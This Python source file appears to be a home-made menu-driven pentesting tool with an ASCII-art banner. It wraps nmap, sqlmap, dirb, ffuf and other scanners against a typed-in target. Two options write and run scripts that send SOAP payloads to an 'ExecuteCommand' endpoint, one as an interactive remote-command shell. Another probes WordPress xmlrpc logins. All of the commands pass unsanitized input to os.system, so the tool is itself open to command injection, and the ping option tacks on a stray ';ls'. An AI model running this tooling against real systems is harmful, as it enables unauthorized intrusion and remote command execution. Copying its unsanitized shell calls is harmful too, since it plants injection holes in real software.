import os
import re
import requests
import socket
import subprocess
from urllib.parse import urlparse
from colorama import Fore, init

def is_ip_address(address):
    pattern = r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"
    return re.match(pattern, address)

def scan_target(target):
    scan_command = f"nmap -sS -sV -oX {target}.xml {target}"
    os.system(scan_command)
    with open(f"{target}.xml", "r") as f:
        scan_result = f.read()
    print(scan_result)
    return scan_result

def check_website(scan_result):
    ports = [80, 8080, 443]
    for port in ports:
        if f"<port protocol=\"tcp\" portid=\"{port}\">" in scan_result:
            print(f"Website found on port {port}")
            return

def get_target():
    target = input("What is the website? ")
    return target

def display_colored_art(art):
    init(autoreset=True)
    banner_lines = art.split("\n")
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

    for line in banner_lines:
        color_line = ""
        for i, char in enumerate(line):
            color_line += colors[i % len(colors)] + char
        print(color_line)


# Replace 'your_ascii_art' with the actual ASCII art you want to display
your_ascii_art = """
                                                               
         ...          . . . .   ....  (. .... .    ...                          
      ..             ..   ./. . .  ##((((((#%,  ..  .#.                 . .     
           .. .... .. . /*/*/*. ../(((///(((#*. .,#(((###.. .                   
 ..         . .    ..,//,,,,,*/ . . /((((((* ....#((((((#(/  .  .   ..          
           . .(,((.. .((#*,,*/(/* ..,#%(%#%( ../((#((((*%(* ..&% ,% .           
           #(####### . .(/%&(%%##. ..(//(((( . /#(%#%%#/ .. %#%#%%%*%.          
          ,#(##(((#(((. ..*#######. ./////(#. /(//(#(%.   %#%%#####%%, ..       
         ...(##((##%/**/   /(######../*////(.*(/*#((%  ..#(##%%%##%# ...        
       #/./...,#%(*******(  (######%.##(####/(//(((#. /(((((((%&(. . ,. / .     
 . .,#####(..  . ../*******/*(%%%%((((((((((((#%%%#.#(((((((#( .. ,/./***//*.  .
  .%%#(((((#&%%#*   ./****/(%#(######((((((#####(##%%#((((#,. . /#%%*******//.  
   *###(#(###&%%####&/./((#((#########################&%# .(%#(((#%*#****,**/ . 
     *%..##&%###(#####%&,,,,,,*/(######**/%####%(/*,,,,,%%((((######%/(../* .   
   . .  . .. ...#%####&,,,,,,,,,,,,,,((/((%*,,,,,,,,,,,,,#%####%#    .  .   .   
          ..  . .    /(#((/,,,,,,,,,,(////%*,,,,,,,,,,*(((%*...   ..            
             .  #***(#((%.@@&&&&@@.#(#///(%(( &@&&&&@@*,(((#**,#..              
            ..***/#.,(((%.&@@@@@@@*%(#,,,,### @&&&&&@&#*(((* ////#.  .          
           .  %(/#  ,(((((,..,,...(((#/(//##(#,,...,..*#/((* .*/((.             
            . #(##  .((((/////////(((%####%((((//////(/((((/ ./###.. .          
              ,(((#,*###(/((//////(((#%%%%#((((/(//////((#%#.%((((              
                /#((##########((*.&@@@@@@@@@@@* #((########%#((# .              
                    *########### %&@&@&@@&&@&@@.&##########&..                  
                 . .#**(######## %@&%%(#(#(%%@@.%########(*/ .                  
                 . ./*******/###/ %%%%(((((%#&. %#%#/*******.                   
                  .***/*/*********(%%%((#((%##/*************/.                  
                  .%(((/****/*****(%#%%%%%%%%#//***/*/***((#%                   
                  ,(#((#(##*******/((#######((*******##(##((#.                  
                 .. (#((#(#((#((/******/****/**/((##(#(###%/.                   
                   .. ..%(#((########((((((#########((##                        
                     . . . /####(#(##########(######* .  .                      
                  .     .  .   *##(#((######(##%,     .                     ..  
     .                               .,*,,.  .                                  
                                   ..    .             

"""

created_by = "Created by ketchup"
version = "Version 1.0"

def menu():
    print("\nOptions:")
    print("1. Use openssl s_client to find certificate transparency")
    print("2. Check crt.sh for subdomains")
    print("3. Use wayback machine to get URLs")
    print("4. Check headers with curl")
    print("5. Whatweb - analyze website")
    print("6. WAF detection with wafw00f")
    print("7. Analyze website with aquatone")
    print("8. SQL injection scan with sqlmap")
    print("9. Directory scanning with dirb and ffuf")
    print("10. Test SOAP endpoint with client.py")
    print("11. Automate API calls with automate.py")
    print("12. Ping target")
    print("13. Test XML-RPC with curl")
    print("0. Exit")

def option_1(target):
    os.system(f"openssl s_client -connect {target}:443 -servername {target} -showcerts")

def option_2(target):
    os.system(f'curl -s "https://crt.sh/?q={target}&output=json" | jq -r \'.[] | "\(.name_value)\n\(.common_name)"\' | sort -u > "{target}_crt.sh.txt"')

def option_3(target):
    os.system(f"waybackurls -dates {target} > waybackurls.txt")

def option_4(target):
    os.system(f"curl -I 'http://{target}'")

def option_5(target):
    os.system(f"whatweb -a3 {target} -v")

def option_6(target):
    os.system(f"wafw00f -v {target}")

def option_7(target):
    if not os.path.exists("aquatone"):
        os.system("go get -u github.com/michenriksen/aquatone")
    os.system(f"cat {target}.xml | aquatone -nmap")

def option_8(target):
    def is_ip_address(target):
        try:
            socket.inet_aton(target)
            return True
        except socket.error:
            return False
    
    if is_ip_address(target):
        url = f"http://{target}"
    else:
        parsed = urlparse(target)
        if not parsed.scheme:
            url = f"http://{target}"
        else:
            url = target

    scan_command = f"sqlmap -u {url} --forms --crawl=2 --batch --is-dba"

    # Run the initial SQLMap scan
    output = subprocess.check_output(scan_command, shell=True, text=True)
    
    print(output)

    # Search for suggestions in the SQLMap output
    suggestions = re.findall(r"you can rerun.+using the following.+?:\n\n(.+?)\n", output)

    # Check if any suggestions were found
    if suggestions:
        print("\n[+] Running suggested commands from the first scan:\n")
        
        # Run each suggested command in a new SQLMap scan
        for suggestion in suggestions:
            print(f"[*] Running: sqlmap {suggestion}\n")
            os.system(f"sqlmap {suggestion}")
            print("\n")
    else:
        print("[-] No suggestions found from the first scan.")
def option_9(target):
    os.system(f"dirb  http://{target}/")
    os.system(f"curl {target}/wsdl")
    os.system(f"curl {target}/wsdl?wsdl")
    os.system(f"ffuf -w 'burp-parameter-names.txt' -u 'http://{target}/wsdl?FUZZ' -fs 0 -mc 200")

def option_10(target):
    with open("client.py", "w") as f:
        f.write(f'''import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://{target}/wsdl", data=payload, headers={{"SOAPAction":'"ExecuteCommand"'}}).content)
''')
    os.system("python3 client.py")

def option_11(target):
    with open("automate.py", "w") as f:
        f.write(f'''import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{{cmd}}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://{target}/wsdl", data=payload, headers={{"SOAPAction":'"ExecuteCommand"'}}).content)
''')
    os.system("python3 automate.py")

def option_12(target):
    os.system(f"ping {target};ls")

def option_13(target):
    os.system(f'''curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" {target}/xmlrpc.php''')

def main():
    display_colored_art(your_ascii_art)
     
    print("\n" + created_by)
    print(version + "\n")
     
    input("Press Enter to continue...")

    T = input("Enter target (IP or website): ")
    if not is_ip_address(T):
        parsed_url = urlparse(T)
        T = parsed_url.netloc if parsed_url.netloc else parsed_url.path

    scan_result = scan_target(T)
    if is_ip_address(T):
        check_website(scan_result)

    target = get_target()

    while True:
        menu()
        try:
            choice = int(input("Enter your choice: "))
        except ValueError:
            print("Invalid choice. Please enter a number.")
            continue

        if choice == 0:
            break
        elif choice == 1:
            option_1(target)
        elif choice == 2:
            option_2(target)
        elif choice == 3:
            option_3(target)
        elif choice == 4:
            option_4(target)
        elif choice == 5:
            option_5(target)
        elif choice == 6:
            option_6(target)
        elif choice == 7:
            option_7(target)
        elif choice == 8:
            option_8(target)
        elif choice == 9:
            option_9(target)
        elif choice == 10:
            option_10(target)
        elif choice == 11:
            option_11(target)
        elif choice == 12:
            option_12(target)
        elif choice == 13:
            option_13(target)

if __name__ == "__main__":
    main()
